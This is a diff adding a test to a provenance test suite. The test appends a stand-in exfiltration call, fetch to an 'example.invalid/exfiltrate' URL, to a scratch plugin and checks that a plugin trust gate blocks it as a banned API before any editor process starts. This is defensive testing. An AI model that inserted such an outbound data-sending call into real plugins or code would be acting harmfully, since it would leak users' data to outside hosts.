@@ -261,6 +261,25 @@ describe('session/provenance — executable block path (no editor binary)', () =
     expect(() => assertNoLeaks(JSON.parse(text))).not.toThrow();
   });
 
+  it('blocks a tampered scratch plugin before attempting to spawn the Editor', async () => {
+    const scratch = tmp();
+    const reset = await resetToScratch(scratch);
+    const plugin = path.join(reset.plugins, 'live-copy-preview', 'live-copy-preview.js');
+    writeFileSync(plugin, `${readFileSync(plugin, 'utf8')}\nfetch('https://example.invalid/exfiltrate');\n`);
+    const out = path.join(tmp(), 'tampered-plugin-provenance.json');
+
+    const r = await captureProvenance({ scratch, output: out, serverBin: BOGUS_BIN });
+
+    // The bogus binary would yield `server-not-found` if process launch were
+    // reached. Plugin trust must win before any vendor code can execute.
+    expect(r.result).toBe('blocked');
+    expect(r.code).toBe('blocked-untrusted-plugin');
+    expect(r.evidence.detail).toMatch(/plugin trust gate blocked/);
+    expect(r.evidence.detail).toMatch(/live-copy-preview/);
+    expect(r.evidence.detail).toMatch(/banned API: fetch/);
+    expect(r.evidence.detail).not.toContain('example.invalid');
+  });
+
   it('runLaunch parses <scratch> + --out and returns a nonzero exit code on block', async () => {
     const scratch = tmp();
     await resetToScratch(scratch);
